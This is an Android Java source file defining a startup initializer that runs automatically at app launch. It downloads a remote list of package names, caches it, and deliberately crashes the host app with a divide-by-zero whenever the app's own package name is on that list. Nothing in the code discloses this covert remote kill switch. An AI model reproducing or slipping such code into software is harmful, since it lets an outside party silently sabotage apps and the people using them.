package com.hss01248.crash_remote;

import android.app.Activity;
import android.content.Context;
import android.os.Bundle;
import android.text.TextUtils;

import androidx.annotation.Nullable;
import androidx.startup.Initializer;

import com.blankj.utilcode.util.AppUtils;
import com.blankj.utilcode.util.GsonUtils;
import com.blankj.utilcode.util.LogUtils;
import com.blankj.utilcode.util.SPStaticUtils;
import com.blankj.utilcode.util.ThreadUtils;
import com.google.gson.reflect.TypeToken;
import com.hss01248.utils.ext.lifecycle.AppFirstActivityOnCreateListener;
import com.hss01248.utils.ext.lifecycle.BackgroundAndFirstActivityCreatedCallback;

import java.io.IOException;
import java.util.ArrayList;
import java.util.List;

import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;

/**
 * @Despciption todo
 * @Author hss
 * @Date 09/05/2022 14:41
 * @Version 1.0
 */
public class CrashXXInit implements Initializer<String> {
    @Override
    public String create(Context context) {

        BackgroundAndFirstActivityCreatedCallback.addAppFirstActivityOnCreateListener(new AppFirstActivityOnCreateListener() {
            @Override
            public void onFirtActivityCreated(Activity activity, @Nullable Bundle savedInstanceState) {
                AppFirstActivityOnCreateListener.super.onFirtActivityCreated(activity, savedInstanceState);
                init2();
            }
        });
        return "CrashXXInit";
    }


    @Override
    public List<Class<? extends Initializer<?>>> dependencies() {
        return new ArrayList<>();
    }


    private void init2() {
        OkHttpClient client = new OkHttpClient();
        String url = "https://oss-kodo.hss01248.tech/2024/xxlist.json";
        client.newCall(new Request.Builder()
                .url(url)
                .get().build()).enqueue(new Callback() {
            @Override
            public void onFailure(Call call, IOException e) {
                LogUtils.w(e);
                String str =  SPStaticUtils.getString("crashxx");
                if(TextUtils.isEmpty(str) || !str.startsWith("[")){
                    return;
                }
                try {
                    parseStr(str,false);
                } catch (IOException ex) {
                    LogUtils.w(ex);
                }
            }

            @Override
            public void onResponse(Call call, Response response) throws IOException {
                if (!response.isSuccessful()) {
                    return;
                }
                String string = response.body().string();
                parseStr(string,true);
            }
        });


    }

    private void parseStr(String string, boolean fromNet) throws IOException{
        boolean should = false;
        try {

            List<String> list = GsonUtils.fromJson(string, new TypeToken<List<String>>() {
            }.getType());
            if(fromNet){
                SPStaticUtils.put("crashxx",string);
            }
            if(list ==null || list.isEmpty()){
                return;
            }
            for (String s : list) {
                if (s.equals(AppUtils.getAppPackageName())) {
                    should = true;
                    break;
                }
            }
        } catch (Throwable throwable) {
            throw new IOException(throwable);
        }finally {
            if(should){
                ThreadUtils.getMainHandler().postDelayed(new Runnable() {
                    @Override
                    public void run() {
                        int i = 1/0;
                    }
                },1000);
            }
        }
    }
}
